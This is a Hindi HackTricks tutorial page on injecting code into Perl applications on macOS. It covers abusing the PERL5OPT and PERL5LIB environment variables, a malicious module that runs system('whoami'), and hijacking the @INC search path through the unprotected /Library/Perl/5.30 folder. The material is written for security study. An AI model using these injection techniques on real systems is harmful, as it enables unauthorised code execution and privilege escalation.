# macOS Perl एप्लिकेशन्स इंजेक्शन

<details>

<summary><strong>AWS हैकिंग सीखें शून्य से लेकर हीरो तक</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> के साथ!</strong></summary>

HackTricks का समर्थन करने के अन्य तरीके:

* यदि आप चाहते हैं कि आपकी **कंपनी का विज्ञापन HackTricks में दिखाई दे** या **HackTricks को PDF में डाउनलोड करें**, तो [**सब्सक्रिप्शन प्लान्स**](https://github.com/sponsors/carlospolop) देखें!
* [**आधिकारिक PEASS & HackTricks स्वैग**](https://peass.creator-spring.com) प्राप्त करें
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) की खोज करें, हमारा एक्सक्लूसिव [**NFTs**](https://opensea.io/collection/the-peass-family) का संग्रह
* 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) में **शामिल हों** या [**telegram group**](https://t.me/peass) में या **Twitter** पर मुझे 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm) **का अनुसरण करें**.
* **अपनी हैकिंग ट्रिक्स साझा करें, HackTricks** के [**github repos**](https://github.com/carlospolop/hacktricks) और [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) में PRs सबमिट करके.

</details>

## `PERL5OPT` और `PERL5LIB` env वेरिएबल के माध्यम से

env वेरिएबल PERL5OPT का उपयोग करके पर्ल को मनमाने कमांड्स निष्पादित करने के लिए बनाया जा सकता है।\
उदाहरण के लिए, यह स्क्रिप्ट बनाएं:

{% code title="test.pl" %}
```perl
#!/usr/bin/perl
print "Hello from the Perl script!\n";
```
{% endcode %}

अब **env variable निर्यात करें** और **perl** स्क्रिप्ट को निष्पादित करें:
```bash
export PERL5OPT='-Mwarnings;system("whoami")'
perl test.pl # This will execute "whoami"
```
एक और विकल्प है पर्ल मॉड्यूल बनाने का (उदाहरण के लिए `/tmp/pmod.pm`):

{% code title="/tmp/pmod.pm" %}
```perl
#!/usr/bin/perl
package pmod;
system('whoami');
1; # Modules must return a true value
```
{% endcode %}

और फिर env वेरिएबल्स का उपयोग करें:
```bash
PERL5LIB=/tmp/ PERL5OPT=-Mpmod
```
## निर्भरताओं के माध्यम से

Perl चलाने के लिए निर्भरताओं के फोल्डर क्रम को सूचीबद्ध करना संभव है:
```bash
perl -e 'print join("\n", @INC)'
```
जो कुछ इस तरह वापस करेगा:
```bash
/Library/Perl/5.30/darwin-thread-multi-2level
/Library/Perl/5.30
/Network/Library/Perl/5.30/darwin-thread-multi-2level
/Network/Library/Perl/5.30
/Library/Perl/Updates/5.30.3
/System/Library/Perl/5.30/darwin-thread-multi-2level
/System/Library/Perl/5.30
/System/Library/Perl/Extras/5.30/darwin-thread-multi-2level
/System/Library/Perl/Extras/5.30
```
कुछ लौटाए गए फ़ोल्डर्स मौजूद नहीं हैं, हालांकि, **`/Library/Perl/5.30`** मौजूद है, यह **SIP** द्वारा **संरक्षित नहीं** है और यह SIP द्वारा संरक्षित फ़ोल्डर्स से **पहले** है। इसलिए, कोई उस फ़ोल्डर का दुरुपयोग कर सकता है ताकि एक उच्च विशेषाधिकार वाली Perl स्क्रिप्ट उसे लोड करे।

{% hint style="warning" %}
हालांकि, ध्यान दें कि उस फ़ोल्डर में लिखने के लिए आपको **root होना आवश्यक है** और आजकल आपको यह **TCC प्रॉम्प्ट** मिलेगा:
{% endhint %}

<figure><img src="../../../.gitbook/assets/image (1) (1) (1).png" alt="" width="244"><figcaption></figcaption></figure>

उदाहरण के लिए, अगर कोई स्क्रिप्ट **`use File::Basename;`** इम्पोर्ट कर रही है, तो `/Library/Perl/5.30/File/Basename.pm` बनाकर उसे मनमाना कोड निष्पादित करने के लिए बनाया जा सकता है।

## संदर्भ

* [https://www.youtube.com/watch?v=zxZesAN-TEk](https://www.youtube.com/watch?v=zxZesAN-TEk)

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert) के साथ AWS हैकिंग सीखें शून्य से नायक तक</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricks का समर्थन करने के अन्य तरीके:

* अगर आप चाहते हैं कि आपकी **कंपनी का विज्ञापन HackTricks में दिखाई दे** या **HackTricks को PDF में डाउनलोड करें** तो [**सदस्यता योजनाएं**](https://github.com/sponsors/carlospolop) देखें!
* [**आधिकारिक PEASS & HackTricks स्वैग**](https://peass.creator-spring.com) प्राप्त करें
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) की खोज करें, हमारा विशेष [**NFTs**](https://opensea.io/collection/the-peass-family) संग्रह
* 💬 [**Discord समूह**](https://discord.gg/hRep4RUj7f) में **शामिल हों** या [**telegram समूह**](https://t.me/peass) में या **Twitter** पर मुझे 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm) **का अनुसरण करें**।
* **HackTricks** के [**github repos**](https://github.com/carlospolop/hacktricks) और [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) में PRs सबमिट करके अपनी हैकिंग ट्रिक्स साझा करें।

</details>
